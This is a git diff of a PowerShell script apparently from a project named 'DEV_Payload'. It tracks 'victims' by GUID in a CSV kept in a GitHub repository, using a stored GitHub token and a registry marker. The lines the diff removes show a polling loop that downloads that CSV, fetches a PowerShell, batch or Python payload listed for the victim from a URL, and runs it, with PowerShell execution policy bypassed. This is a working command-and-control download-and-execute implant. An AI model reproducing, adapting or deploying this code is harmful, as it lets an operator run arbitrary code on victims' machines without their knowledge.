@@ -4,7 +4,7 @@
 # ===============================================
 
 # === CONFIGURATION SETTINGS ===
-$GitHubToken          = Get-Content -Path "D:\github_token.txt" -Raw
+$GitHubToken = Get-Content -Path "D:\github_token.txt" -Raw
 $RepoOwner            = "Umair13303"
 $RepoName             = "DEV_Payload"
 $CsvPathInRepo        = "GitHub_Script/Excel/Victim_Record_GitHub.csv"
@@ -16,8 +16,6 @@ $RegistryValue        = "PRE_ATTACK_GUID_REG_KEY"
 $PayloadFolder        = "$env:APPDATA\Payloads"
 $LogFile              = "$env:APPDATA\watcher_log.txt"
 
-$FirstWaitSeconds     = 5
-$LoopIntervalSeconds  = 15
 $UserAgent            = "Watcher-Script"
 
 # === LOGGING FUNCTION ===
@@ -65,7 +63,7 @@ $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 # === ADD MessageBox ===
 Add-Type -AssemblyName PresentationFramework
 
-# === FETCH CSV METADATA AND DOWNLOAD URL ONCE ===
+# === FETCH CSV METADATA AND DOWNLOAD URL ===
 try {
     [System.Windows.MessageBox]::Show("Fetching CSV metadata...")
     $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
@@ -162,75 +160,4 @@ try {
 catch {
     Log-Message "[$(Get-Date)] ❌ Registration failed: $_"
     [System.Windows.MessageBox]::Show("Registration failed: " + $_)
-}
-
-# === WAIT BEFORE STARTING POLLING ===
-Start-Sleep -Seconds $FirstWaitSeconds
-[System.Windows.MessageBox]::Show("Starting polling loop...")
-
-# === POLLING LOOP ===
-while ($true) {
-    try {
-        [System.Windows.MessageBox]::Show("Polling: downloading CSV...")
-        $csvText = $wc.DownloadString($downloadUrl)
-        $lines = $csvText -split "`r?`n"
-        $foundPayload = $false
-
-        foreach ($line in $lines) {
-            if ($line -match "^\d+,") {
-                $cols = $line -split ","
-                if ($cols[1] -eq $Victim_GUID -and $cols[9].Trim() -eq "TRUE") {
-                    $foundPayload = $true
-
-                    $payloadType = $cols[7].Trim()
-                    $payloadURL  = $cols[8].Trim()
-
-                    $ext = ".txt"
-                    if ($payloadType -eq "PowerShell") { $ext = ".ps1" }
-                    elseif ($payloadType -eq "Batch")  { $ext = ".bat" }
-                    elseif ($payloadType -eq "Python") { $ext = ".py" }
-                    else {
-                        Log-Message "[$(Get-Date)] ⚠️ Unknown payload type: $payloadType"
-                        [System.Windows.MessageBox]::Show("Unknown payload type: $payloadType")
-                        continue
-                    }
-
-                    $localPath = Join-Path $PayloadFolder ("payload" + $ext)
-
-                    [System.Windows.MessageBox]::Show("Downloading payload from: $payloadURL")
-                    (New-Object Net.WebClient).DownloadString($payloadURL) | Out-File -Encoding UTF8 -FilePath $localPath
-
-                    if ($payloadType -eq "PowerShell") {
-                        Log-Message "[$(Get-Date)] ⚡ Executing PowerShell payload..."
-                        [System.Windows.MessageBox]::Show("Executing PowerShell payload...")
-                        powershell -ExecutionPolicy Bypass -File "$localPath"
-                    }
-                    elseif ($payloadType -eq "Batch") {
-                        Log-Message "[$(Get-Date)] ⚡ Executing Batch payload..."
-                        [System.Windows.MessageBox]::Show("Executing Batch payload...")
-                        Start-Process -FilePath "$localPath"
-                    }
-                    elseif ($payloadType -eq "Python") {
-                        Log-Message "[$(Get-Date)] ⚡ Executing Python payload..."
-                        [System.Windows.MessageBox]::Show("Executing Python payload...")
-                        Start-Process -FilePath "python.exe" -ArgumentList "$localPath"
-                    }
-
-                    Log-Message "[$(Get-Date)] ✅ Executed $payloadType from $payloadURL"
-                    [System.Windows.MessageBox]::Show("Executed $payloadType successfully.")
-                }
-            }
-        }
-
-        if (-not $foundPayload) {
-            Log-Message "[$(Get-Date)] ⚠️ No payload found for this GUID."
-            [System.Windows.MessageBox]::Show("No payload found for this GUID.")
-        }
-    }
-    catch {
-        Log-Message "[$(Get-Date)] ❌ Polling error: $_"
-        [System.Windows.MessageBox]::Show("Polling error: " + $_)
-    }
-
-    Start-Sleep -Seconds $LoopIntervalSeconds
 }
